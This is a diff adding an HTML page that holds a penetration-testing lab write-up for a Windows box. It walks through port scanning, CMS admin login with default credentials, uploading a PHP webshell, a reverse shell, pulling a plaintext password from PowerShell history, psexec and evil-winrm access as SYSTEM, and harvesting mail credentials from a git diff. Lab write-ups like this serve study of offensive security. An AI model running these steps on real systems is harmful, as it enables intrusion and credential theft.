@@ -1,0 +1,222 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">BOX249</h1>
+    <div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab2/249]
+└─$ <u>sudo nmap -p- -sCV 192.168.214.249 --min-rate=10000 > tcp</u>
+PORT      STATE SERVICE       VERSION
+80/tcp    open  http          Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows Server
+| http-methods: 
+|_  Potentially risky methods: TRACE
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+| ssl-cert: Subject: commonName=LEGACY
+| Not valid before: 2025-11-19T10:28:34
+|_Not valid after:  2026-05-21T10:28:34
+|_ssl-date: 2025-11-20T10:33:08+00:00; 0s from scanner time.
+| rdp-ntlm-info: 
+|   Target_Name: LEGACY
+|   NetBIOS_Domain_Name: LEGACY
+|   NetBIOS_Computer_Name: LEGACY
+|   DNS_Domain_Name: LEGACY
+|   DNS_Computer_Name: LEGACY
+|   Product_Version: 10.0.20348
+|_  System_Time: 2025-11-20T10:33:00+00:00
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+8000/tcp  open  http          Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/7.4.30)
+| http-title: Welcome to XAMPP
+|_Requested resource was http://192.168.214.249:8000/dashboard/
+|_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/7.4.30
+|_http-open-proxy: Proxy might be redirecting requests
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+49670/tcp open  msrpc         Microsoft Windows RPC</code></pre></div>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/relia/249/1.png' %}" alt="">
+    <img src="{% static 'EthHack/images/relia/249/1.png' %}" alt="">
+</div>
+
+<p class="text">The first one (port80) is IIS service. It's often uses aspx file extention for the website.</p>
+<p class="text">The second one is XAMPP and often uses php file extension for website.</p>
+<p class="text">Since php tends to be more vulnerable to attack, I'll enumerate XAMPP server at first.</p>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab2/249]
+└─$ feroxbuster -u http://192.168.162.249:8000 -x php > ferox
+
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.11.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://192.168.162.249:8000
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.11.0
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔎  Extract Links         │ true
+ 💲  Extensions            │ [php]
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+ 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────</code></pre></div>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab2/249]
+└─$ cat ferox | grep cms
+301      GET        9l       30w      348c http://192.168.162.249:8000/cms => http://192.168.162.249:8000/cms/
+301      GET        9l       30w      358c http://192.168.162.249:8000/cms/templates => http://192.168.162.249:8000/cms/templates/
+...</code></pre></div>
+
+<p class="text">There seems to be CMS server. Let's find admin page.</p>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab2/249]
+└─$ cat ferox | grep admin
+200      GET       36l       82w     1117c http://192.168.162.249:8000/cms/admin.php
+403      GET       11l       47w      426c http://192.168.162.249:8000/phpmyadmin
+200      GET       36l       82w     1117c http://192.168.162.249:8000/CMS/admin.php</code></pre></div>
+
+<p class="text">I found it easily.</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/relia/249/3.png' %}" alt="">
+    <img src="{% static 'EthHack/images/relia/249/4.png' %}" alt="">
+</div>
+<p class="text">Trying easy password <u>admin:admin</u>, I successfully logged on the CMS.</p>
+
+
+<div class="img">
+    <img src="{% static 'EthHack/images/relia/249/5.png' %}" alt="">
+    <p class="text">The page file manager allow us to delete/upload files. There is .htaccess file which may be interuption to upload malicions file. Let's delete them and upload simple webshell.</p>
+</div>
+
+
+<div class="img">
+    <img src="{% static 'EthHack/images/relia/249/6.png' %}" alt="">
+    <p class="text">Then, upload simple webshell php file to the server. We can locate the uploaded file location with feroxbuster output before we got.</p>
+</div>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab2/249]
+└─$ cat ferox | grep files 
+301      GET        9l       30w      354c http://192.168.162.249:8000/cms/files => http://192.168.162.249:8000/cms/files/
+301      GET        9l       30w      354c http://192.168.162.249:8000/CMS/files => http://192.168.162.249:8000/CMS/files/</code></pre></div>
+
+
+<div class="img">
+    <img src="{% static 'EthHack/images/relia/249/7.png' %}" alt="">
+    <p class="text">Though it returns error code, I could get valid output with parameter cmd=whoami. The page seems to be ran by adrian user.</p>
+</div>
+
+<p class="text">Using base64 encoded revshell code, I successfully got reverse shell.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab2/249]
+└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [192.168.45.246] from (UNKNOWN) [192.168.212.249] 61415
+whoami
+legacy\adrian
+PS C:\xampp\htdocs\cms\files> </code></pre></div>
+
+<h2 class="subtitle">PrivEsc</h2>
+<p class="text">Adrian has command line history.</p>
+<div class="code-box"><pre><code>PS C:\> type C:\Users\adrian\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+ipconfig
+hostname
+echo "Let's check if this script works running as damon and password <u>i6yuT6tym@</u>"
+echo "Don't forget to clear history once done to remove the password!"
+Enter-PSSession -ComputerName LEGACY -Credential $credshutdown /s</code></pre></div>
+
+<p class="text">We can use this credential.</p>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab2/249]
+└─$ impacket-psexec damon:'i6yuT6tym@'@192.168.212.249 powershell
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Requesting shares on 192.168.212.249.....
+[*] Found writable share ADMIN$
+[*] Uploading file CYQZsKtg.exe
+[*] Opening SVCManager on 192.168.212.249.....
+[*] Creating service nMEt on 192.168.212.249.....
+[*] Starting service nMEt.....
+[!] Press help for extra shell commands
+        Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+
+whoami
+PS C:\Windows\system32> whoami
+nt authority\system</code></pre></div>
+
+
+<h2 class="subtitle">Post PE</h2>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab2]
+└─$ evil-winrm -i 192.168.212.249 -u damon -p 'i6yuT6tym@'                            
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\damon\Documents></code></pre></div>
+<p class="text">There is interesting folder named 'staging'. Under there, .git folder found.</p>
+<div class="code-box"><pre><code>*Evil-WinRM* PS C:\staging\.git> git log
+commit 8b430c17c16e6c0515e49c4eafdd129f719fde74
+Author: damian <damian>
+Date:   Thu Oct 20 02:07:42 2022 -0700
+
+    Email config not required anymore
+
+commit 967fa71c359fffcbeb7e2b72b27a321612e3ad11
+Author: damian <damian>
+Date:   Thu Oct 20 02:06:37 2022 -0700
+
+    V1</code></pre></div>
+
+    <p class="text">There are two logs. Let's see difference.</p>
+
+    <div class="code-box"><pre><code>*Evil-WinRM* PS C:\staging\.git> git diff 8b430c17c16e6c0515e49c4eafdd129f719fde74 967fa71c359fffcbeb7e2b72b27a321612e3ad11
+diff --git a/htdocs/cms/data/email.conf.bak b/htdocs/cms/data/email.conf.bak
+new file mode 100644
+index 0000000..77e370c
+--- /dev/null
++++ b/htdocs/cms/data/email.conf.bak
+@@ -0,0 +1,5 @@
++Email configuration of the CMS
++<u>maildmz@relia.com:DPuBT9tGCBrTbR</u>
++
++If something breaks contact <u>jim@relia.com</u> as he is responsible for the mail server.
++Please don't send any office or executable attachments as they get filtered out for security reasons.
+\ No newline at end of file</code></pre></div>
+
+<p class="text">We got maildmz user credential. Also, we can see the mail address for jim.</p>
+
+
+
+
+</body>
+</html>
